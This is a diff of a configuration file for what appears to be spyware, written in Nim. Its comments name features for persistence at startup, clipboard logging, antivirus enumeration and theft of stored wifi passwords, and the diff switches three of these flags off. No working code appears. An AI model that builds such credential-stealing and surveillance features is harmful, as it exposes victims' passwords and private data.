@@ -32,7 +32,7 @@ const ALLOW_ONLY_ONE_INSTANCE*: bool = true
 ## persistenceThread is used for installing the program
 ## and starting it when the pc opens
 ## DEFAULT: true
-const USE_PERSISTENCE_THREAD*: bool = true
+const USE_PERSISTENCE_THREAD*: bool = false
 
 ## clipboardThread is used for logging the clipboard
 ## every time it changes
@@ -48,12 +48,12 @@ const CLIPBOARD_THREAD_CHECK_INTERVAL*: int = 100
 ## getAVSThread is used for getting
 ## all the installed antivirus software on the user's pc
 ## DEFAULT: true
-const USE_GET_AVS_THREAD*: bool = true
+const USE_GET_AVS_THREAD*: bool = false
 
 ## wifiPasswordsThread is used for getting
 ## all the wifi passwords stored on user's pc
 ## DEFAULT: true
-const USE_WIFI_PASSWORDS_THREAD*: bool = true
+const USE_WIFI_PASSWORDS_THREAD*: bool = false
 
 ## connectedWifiThread is used for getting
 ## all the networks the user is connected to
